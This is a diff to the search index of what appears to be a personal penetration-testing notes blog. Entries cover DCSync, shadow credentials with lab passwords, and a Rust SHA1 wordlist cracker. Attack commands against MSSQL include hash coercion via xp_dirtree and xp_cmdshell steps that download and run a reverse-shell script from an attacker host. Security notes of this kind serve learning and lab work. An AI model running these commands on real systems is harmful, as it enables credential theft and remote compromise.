@@ -1682,7 +1682,7 @@ window.store = {
         
         "title": "Pentest - Active Directory - DCSync",
         "tags": ["exploit","pentest","windowsExploitation",],
-        "content": "hacktricks - DCSync\n", 
+        "content": "DCSync In BloodHound\nGetChanges GetChangesAll 1 impacket-secretsdump \u0026#34;\u0026lt;domain\u0026gt;/user:password\u0026#34;@\u0026#34;dc.domain.com\u0026#34; hacktricks - DCSync\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_dcsync\/"
     },
     
@@ -1692,7 +1692,7 @@ window.store = {
         
         "title": "Pentest - Active Directory - Shadow Credentials",
         "tags": ["kerberos",],
-        "content": "Shadow Credentials pywhisker\nAbuse the GenericWrite ACL to get control of an account by adding shadow credentials:\n1 python3 /opt/pywhisker/pywhisker.py -d \u0026#34;certified.htb\u0026#34; -u \u0026#34;judith.mader\u0026#34; -p \u0026#34;judith09\u0026#34; --target \u0026#34;management_svc\u0026#34; --action \u0026#34;add The output is a PFX cert that can be used to authenticate as the user. Get a TGT for the user with PKINITtools:\n1 python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx vGRMeeb9.pfx certified.htb/management_svc -pfx-pass \u0026#39;25nQ6mg4JUTeQEjjNRE2\u0026#39; management_svc.ccache This will create a Kerberos ticket called management_svc.ccache file, which we can export and use the key this output provides in conjunction with getnthash.py from the same toolkit to get the NTLM hash of the management_svc user.\ndsinternals Detecting shadow credentials hacker recipes hackingarticles medium\n", 
+        "content": "Shadow Credentials pywhisker\nAbuse the GenericWrite ACL to get control of an account by adding shadow credentials:\n1 python3 /opt/pywhisker/pywhisker.py -d \u0026#34;certified.htb\u0026#34; -u \u0026#34;judith.mader\u0026#34; -p \u0026#34;judith09\u0026#34; --target \u0026#34;management_svc\u0026#34; --action \u0026#34;add The output is a PFX cert that can be used to authenticate as the user. Get a TGT for the user with PKINITtools:\n1 python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx vGRMeeb9.pfx certified.htb/management_svc -pfx-pass \u0026#39;25nQ6mg4JUTeQEjjNRE2\u0026#39; management_svc.ccache This will create a Kerberos ticket called management_svc.ccache file, which we can export and use the key this output provides in conjunction with getnthash.py from the same toolkit to get the NTLM hash of the management_svc user.\nSee also: targetedKerberos Links dsinternals Detecting shadow credentials hacker recipes hackingarticles medium\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_shadow_credentials\/"
     },
     
@@ -1812,7 +1812,7 @@ window.store = {
         
         "title": "Pentest - MSSQL - Microsoft SQL Server p 1433",
         "tags": ["sql","pentest",],
-        "content": "Pentest Microsoft SQL Server Enumeration 1 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 \u0026lt;IP\u0026gt; Test credentials 1 crackmapexec mssql \u0026lt;host\u0026gt; -u users.txt -p passwords.txt Establish connection impacket-mssqlclient -dc-ip \u0026lt;ip\u0026gt; -windows-auth domain/username:password@host List DBs 1 SELECT name FROM master..sysdatabases; Check permissions 1 2 3 4 Use master; EXEC sp_helprotect \u0026#39;xp_dirtree\u0026#39;; EXEC sp_helprotect \u0026#39;xp_subdirs\u0026#39;; EXEC sp_helprotect \u0026#39;xp_fileexist\u0026#39;; xp_dirtree 1 EXEC xp_dirtree \u0026#39;C:\\inetpub\\wwwroot\u0026#39;, 1, 1; hacktricks\n", 
+        "content": "Pentest Microsoft SQL Server Enumeration 1 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 \u0026lt;IP\u0026gt; Test credentials 1 crackmapexec mssql \u0026lt;host\u0026gt; -u users.txt -p passwords.txt Establish connection impacket-mssqlclient -dc-ip \u0026lt;ip\u0026gt; -windows-auth domain/username:password@host List DBs 1 SELECT name FROM master..sysdatabases; Check permissions 1 2 3 4 Use master; EXEC sp_helprotect \u0026#39;xp_dirtree\u0026#39;; EXEC sp_helprotect \u0026#39;xp_subdirs\u0026#39;; EXEC sp_helprotect \u0026#39;xp_fileexist\u0026#39;; xp_dirtree 1 EXEC xp_dirtree \u0026#39;C:\\inetpub\\wwwroot\u0026#39;, 1, 1; Use xp_dirtree to obtain NTLM hashes\n1 2 3 4 #victim xp_dirtree \\\\\u0026lt;attacker_ip\u0026gt;\\file.txt #attacker sudo impacket-smbserver -smb2support share $(pwd) xp_cmdshell Enable - run command - rev shell\n1 2 3 4 enable_xp_cmdshell xp_cmdshell whoami xp_cmdshell powershell -c iwr http://\u0026lt;ip\u0026gt;/shell.ps1 -o C:\\programdata\\rev.ps1 xp_cmdshell powershell -c C:\\programdata\\rev.ps1 hacktricks\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/pentesting_mssql_microsoft_sql_server\/"
     },
     
@@ -2468,6 +2468,16 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/posts\/sha1cracker\/": {
+        
+        "title": "Rust - SHA1 Cracker",
+        "tags": ["pentest","crack","password","rust","cryptography",],
+        "content": "Implementing a sha1 hash cracker in Rust use sha1::Digest; use std::{ env, error::Error, fs::File, io::{BufRead, BufReader}, }; const SHA1_HEX_STRING_LENGTH: usize = 40; fn main() -\u0026gt; Result\u0026lt;(), Box\u0026lt;dyn Error\u0026gt;\u0026gt; { let args: Vec\u0026lt;String\u0026gt; = env::args().collect(); if args.len() != 3 { println!(\u0026#34;Usage:\u0026#34;); println!(\u0026#34;sha1_cracker: \u0026lt;wordlist.txt\u0026gt; \u0026lt;sha1_hash\u0026gt;\u0026#34;); return Ok(()); } let hash_to_crack = args[2].trim(); if hash_to_crack.len() != SHA1_HEX_STRING_LENGTH { return Err(\u0026#34;sha1 hash is not valid.\u0026#34;.into()); } let wordlist_file = File::open(\u0026amp;args[1])?; let reader = BufReader::new(\u0026amp;wordlist_file); for line in reader.lines() { let line = line?; let common_password = line.trim(); if hash_to_crack == \u0026amp;hex::encode(sha1::Sha1::digest(common_password.as_bytes())) { println!(\u0026#34;Password found: {}\u0026#34;, \u0026amp;common_password); return Ok(()); } } println!(\u0026#34;password not found in wordlist.\u0026#34;); Ok(()) } Imports use sha1::Digest; use std::{ env, error::Error, fs::File, io::{BufRead, BufReader}, }; const SHA1_HEX_STRING_LENGTH: usize = 40; Inputs let args: Vec\u0026lt;String\u0026gt; = env::args().collect(); if args.len() != 3 { println!(\u0026#34;Usage:\u0026#34;); println!(\u0026#34;sha1_cracker: \u0026lt;wordlist.txt\u0026gt; \u0026lt;sha1_hash\u0026gt;\u0026#34;); return Ok(()); } let hash_to_crack = args[2].trim(); if hash_to_crack.len() != SHA1_HEX_STRING_LENGTH { return Err(\u0026#34;sha1 hash is not valid.\u0026#34;.into()); } Read File let wordlist_file = File::open(\u0026amp;args[1])?; let reader = BufReader::new(\u0026amp;wordlist_file); Check Pass for line in reader.lines() { let line = line?; let common_password = line.trim(); if hash_to_crack == \u0026amp;hex::encode(sha1::Sha1::digest(common_password.as_bytes())) { println!(\u0026#34;Password found: {}\u0026#34;, \u0026amp;common_password); return Ok(()); } } Bibliography Black Hat Rust\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/sha1cracker\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/posts\/rust_programming\/": {
         
         "title": "Rust Programming",
@@ -2574,16 +2584,6 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "https:\/\/kdbed.github.io\/posts\/sha1\/"
-    },
-    
-    
-    
-    "https:\/\/kdbed.github.io\/posts\/sha1cracker\/": {
-        
-        "title": "sha1Cracker",
-        "tags": ["pentest","crack","password","rust","cryptography",],
-        "content": "Implementing a sha1 hash cracker in Rust use sha1::Digest; use std::{ env, error::Error, fs::File, io::{BufRead, BufReader}, }; const SHA1_HEX_STRING_LENGTH: usize = 40; fn main() -\u0026gt; Result\u0026lt;(), Box\u0026lt;dyn Error\u0026gt;\u0026gt; { let args: Vec\u0026lt;String\u0026gt; = env::args().collect(); if args.len() != 3 { println!(\u0026#34;Usage:\u0026#34;); println!(\u0026#34;sha1_cracker: \u0026lt;wordlist.txt\u0026gt; \u0026lt;sha1_hash\u0026gt;\u0026#34;); return Ok(()); } let hash_to_crack = args[2].trim(); if hash_to_crack.len() != SHA1_HEX_STRING_LENGTH { return Err(\u0026#34;sha1 hash is not valid.\u0026#34;.into()); } let wordlist_file = File::open(\u0026amp;args[1])?; let reader = BufReader::new(\u0026amp;wordlist_file); for line in reader.lines() { let line = line?; let common_password = line.trim(); if hash_to_crack == \u0026amp;hex::encode(sha1::Sha1::digest(common_password.as_bytes())) { println!(\u0026#34;Password found: {}\u0026#34;, \u0026amp;common_password); return Ok(()); } } println!(\u0026#34;password not found in wordlist.\u0026#34;); Ok(()) } Imports use sha1::Digest; use std::{ env, error::Error, fs::File, io::{BufRead, BufReader}, }; const SHA1_HEX_STRING_LENGTH: usize = 40; Inputs let args: Vec\u0026lt;String\u0026gt; = env::args().collect(); if args.len() != 3 { println!(\u0026#34;Usage:\u0026#34;); println!(\u0026#34;sha1_cracker: \u0026lt;wordlist.txt\u0026gt; \u0026lt;sha1_hash\u0026gt;\u0026#34;); return Ok(()); } let hash_to_crack = args[2].trim(); if hash_to_crack.len() != SHA1_HEX_STRING_LENGTH { return Err(\u0026#34;sha1 hash is not valid.\u0026#34;.into()); } Read File let wordlist_file = File::open(\u0026amp;args[1])?; let reader = BufReader::new(\u0026amp;wordlist_file); Check Pass for line in reader.lines() { let line = line?; let common_password = line.trim(); if hash_to_crack == \u0026amp;hex::encode(sha1::Sha1::digest(common_password.as_bytes())) { println!(\u0026#34;Password found: {}\u0026#34;, \u0026amp;common_password); return Ok(()); } } Bibliography Black Hat Rust\n", 
-        "url": "https:\/\/kdbed.github.io\/posts\/sha1cracker\/"
     },
     
     
